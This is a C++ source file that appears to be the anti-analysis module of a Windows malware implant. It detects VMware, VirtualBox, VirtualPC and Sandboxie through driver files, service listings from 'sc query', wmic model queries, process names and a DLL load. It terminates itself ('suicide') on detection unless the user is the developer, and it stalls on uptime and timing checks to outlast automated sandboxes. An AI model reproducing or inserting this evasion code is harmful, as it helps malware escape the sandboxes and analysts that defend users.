

#include "vm.h"

#include "FileHelper.h"

#include "utils.h"

#include <winsock.h>


#pragma comment(lib,"ws2_32.lib")


int VM::checkVM() {

	int ret = 0;

	int vmlabel = FALSE;

	do 
	{
		char syspath[MAX_PATH];
		int len = GetSystemDirectoryA(syspath, sizeof(syspath));
		syspath[len] = 0;
		string driverpath = string(syspath) + "\\drivers\\";

		ret = FileHelper::CheckFileExist(driverpath + "vmmouse.sys");		//vmmemctl.sys
		if (ret)
		{
			vmlabel = 1;
			break;
		}

		ret = FileHelper::CheckFileExist(driverpath + "VBoxMouse.sys");		//VBoxGuest
		if (ret)
		{
			vmlabel = 2;
			break;
		}
	
		const char* cmd = "sc query";
		shell(cmd);
		char* file = 0;
		int filesize = 0;
		ret = FileHelper::fileReader(CMD_RESULT_FILENAME, &file, &filesize);
		if (ret)
		{
			file[filesize] = 0;
			string vgauth = string("SERVICE_NAME: ") + "VGAuthService\r\n";
			string tool = string("SERVICE_NAME: ") + "VMTools\r\n";
			string vboxserv = string("SERVICE_NAME: ") + "VboxService\r\n";
		
			if (strstr(file, vgauth.c_str()) || strstr(file, tool.c_str()))
			{
				vmlabel = 1;
				break;
			}
			else if (strstr(file, vboxserv.c_str()))
			{
				vmlabel = 2;
				break;
			}
		}

		cmd = "wmic path Win32_ComputerSystem get Model";
		shell(cmd);
		ret = FileHelper::fileReader(CMD_RESULT_FILENAME, &file, &filesize);
		if (ret)
		{
			*(DWORD*)(file + filesize)= 0;

			runLog(L"model:%ws\r\n", file);

			const wchar_t * vm = L"VMware";
			const wchar_t* vb = L"VirtualBox";
			const wchar_t* vp = L"VirtualPC";
			if (wcsstr((wchar_t*)file, vm))
			{
				vmlabel = TRUE;
				break;
			}
			else if (wcsstr((wchar_t*)file, vb))
			{
				vmlabel = 2;
				break;
			}else if (wcsstr((wchar_t*)file, vp))
			{
				vmlabel = 3;
				break;
			}
		}
	
		DWORD pid = getPidByName("VGAuthService.exe");
		if (pid)
		{
			vmlabel = 1;
			break;
		}
		pid = getPidByName("vmtoolsd.exe");
		if (pid)
		{
			vmlabel = 1;
			break;
		}
		pid = getPidByName("VBoxService.exe");
		if (pid)
		{
			vmlabel = 2;
			break;
		}
		pid = getPidByName("VBoxTray.exe");
		if (pid)
		{
			vmlabel = 2;
			break;
		}

		HMODULE hdll = LoadLibraryA("sbiedll.dll");
		if (hdll)
		{
			vmlabel = 3;
			break;
		}

	} while (FALSE);

	if (vmlabel)
	{
#ifdef _DEBUG

#else
		char username[MAX_PATH];
		DWORD uslen = sizeof(username);
		GetUserNameA(username,& uslen);

// 		char hostname[MAX_PATH];
// 		ret = gethostname(hostname, sizeof(hostname));

		char computername[MAX_PATH];
		DWORD cpnl = sizeof(computername);
		ret = GetComputerNameA(computername, &cpnl);
		if (lstrcmpA(username,"ljg") /*||lstrcmpA(computername,"DESKTOP-KQBV2P5")*/)
		{
			runLog("maybe i am running in sand box:%d\r\n", vmlabel);
			suicide();
		}
#endif
	}
	runLog("checkVM complete\r\n");
	return ret;
}


int VM::delay(int seconds) {

	ULONGLONG t1 = GetTickCount64() / 1000;
	ULONGLONG t2 = t1;
	do
	{
		t2 = GetTickCount64() / 1000;

		Sleep( 1000);

	} while (t2 - t1 < seconds);

	return 0;
}




int VM::checkTickCount() {

	DWORD dt32 = GetTickCount() / 1000;

	ULONGLONG dt64 = GetTickCount64() / 1000;

	while (dt32 < VM_EVASION_DELAY || dt64 < VM_EVASION_DELAY)
	{
		dt32 = GetTickCount() / 1000;

		dt64 = GetTickCount64() / 1000;

		Sleep(1000);
	}

	for (int i = 0;i < 6;i ++)
	{
		ULONGLONG tm1 = time(0);
		Sleep(1000);
		ULONGLONG tm2 = time(0);
		if (tm2 - tm1 < 1)
		{
			runLog("maybe i am running in sand box\r\n");
			suicide();
		}
	}

	return TRUE;
}






void executeCpuid(DWORD veax, DWORD* Regs)
{
#ifndef _WIN64
	DWORD deax;
	DWORD debx;
	DWORD decx;
	DWORD dedx;

	__asm
	{
		mov eax, veax; 将输入参数移入eax
		cpuid; 执行cpuid
		mov deax, eax; 以下四行代码把寄存器中的变量存入临时变量
		mov debx, ebx
		mov decx, ecx
		mov dedx, edx
	}

	Regs[0] = deax;
	Regs[1] = debx;
	Regs[2] = decx;
	Regs[3] = dedx;
#else
	return;
#endif
}


char* cpuBrand(char* strCpuBrand)
{
	strCpuBrand[0] = 0;

	char strcpu[256] = { 0 };
	DWORD Regs[4] = { 0 };
	DWORD BRANDID = 0x80000002;		// 从0x80000002开始，到0x80000004结束,用来存储商标字符串，48个字符
	for (DWORD i = 0; i < 3; i++)
	{
		executeCpuid(BRANDID + i, Regs);
		RtlMoveMemory(strcpu + i * 16, (char*)Regs, 16);
	}

	lstrcpyA(strCpuBrand, strcpu);

	return strCpuBrand;
}
